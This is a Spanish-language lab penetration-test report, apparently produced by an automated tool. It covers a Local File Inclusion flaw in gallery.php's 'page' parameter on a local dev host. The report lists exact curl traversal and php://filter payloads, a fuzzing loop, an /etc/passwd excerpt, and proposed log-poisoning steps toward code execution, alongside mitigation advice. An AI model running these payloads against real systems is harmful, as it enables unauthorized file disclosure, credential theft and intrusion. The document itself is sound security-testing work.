# Informe de Análisis LFI — Laboratorio

- Objetivo: http://web.dev.local:8081
- Fecha (inicio de informe): 2026-04-18T08:17:58Z

## Resumen ejecutivo
Se identificó y explotó una vulnerabilidad de Local File Inclusion (LFI) en el parámetro "page" de la página gallery.php. Fue posible leer archivos sensibles del sistema, incluyendo /etc/passwd. Impacto: divulgación de información del sistema y usuarios (incluyendo la cuenta www-data). VULN_FOUND y VULN_EXPLOITED confirmadas.

## Punto vulnerable
- URL vulnerable: http://web.dev.local:8081/gallery.php
- Parámetro vulnerable: page
- Vector: inclusión de archivos locales vía path traversal y wrappers php://filter

## Comandos y pruebas realizadas (ejecutadas desde Kali/terminal)
Se usaron solicitudes HTTP con curl para probar traversal y wrappers php://filter. Ejemplos exactos:

1) Prueba básica de traversal:
- curl -s "http://web.dev.local:8081/gallery.php?page=../../../../../../etc/passwd"

2) Prueba con php://filter para forzar lectura/base64 (útil si la salida se interpreta como código):
- curl -s "http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=/etc/passwd"
- curl -s "http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=../../../../../../etc/passwd"

3) Otras rutas y recursos probados (muestra):
- pages/about.php, pages/modern.php, includes/config.php, config.php, .env, .git/config, backup.zip, /proc/self/environ

Comandos de fuzzing/automatización usados (ejemplo):
- for p in page file view template path include; do curl -s "http://web.dev.local:8081/?$p=../../../../../../etc/passwd"; done
- Uso de php://filter en bucles para múltiples recursos.

## Payloads que permitieron la explotación
- ../../../../../../etc/passwd  (direct traversal)
- ../../../etc/passwd
- /etc/passwd
- php://filter/read=convert.base64-encode/resource=/etc/passwd
- php://filter/read=convert.base64-encode/resource=../../../../../../etc/passwd

## Evidencia (extracto de /etc/passwd leído)
Se obtuvo el contenido de /etc/passwd embebido en la respuesta HTML. Extracto:

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...

(El archivo completo se almacenó en archivos temporales de la sesión para referencia.)

## Intentos de escalada adicionales
- Se probó lectura de /proc/self/environ y wrappers para forzar inclusión de ficheros de configuraciones y logs. No se logró extraer /etc/shadow ni claves privadas en esta iteración.
- Recomendaciones para siguientes pasos de prueba (si se autoriza continuar): probar log poisoning (si hay formularios que escriban en logs), intentar inclusion de /var/log/apache2/access.log combinado con payload PHP para RCE, o buscar archivos de configuración con credenciales (config.php, .env, .git/config).

## Impacto
- Divulgación de usuarios del sistema, perfilado de cuentas (ej. www-data).
- Dependiendo de ficheros adicionales accesibles, posibilidad real de escalada a RCE mediante técnicas de log poisoning o inclusión remota de código si existen logs con entradas controlables.

## Recomendaciones de mitigación
1. Validar y sanitizar entradas que se usan en include/require (whitelist de páginas permitidas, p.ej. un array de templates seguros).  
2. Evitar usar valores directos de parámetros en include; usar mapping controlado (switch/case o array).  
3. Desactivar wrappers peligrosos o aplicar open_basedir y su configuración apropiada.  
4. Evitar mostrar contenido de archivos sin validación; asegurar que php:// wrappers no permitan acceso a recursos sensibles.  
5. Corregir permisos de archivos: /etc/shadow y claves privadas deben ser inaccesibles a procesos web.  
6. Implementar WAF y filtros en entrada HTTP como mitigación adicional.

## Archivos y pruebas guardadas
- Resultados completos guardados temporalmente en: /tmp/lfi_gallery_results.txt y /tmp/lfi_test2/results.txt en el entorno de análisis.

---
Informe generado por herramienta automatizada (Kali/Linux, curl + pruebas manuales). Mantener este fichero en el repositorio de reportes del laboratorio y proceder a remediación según política de seguridad.
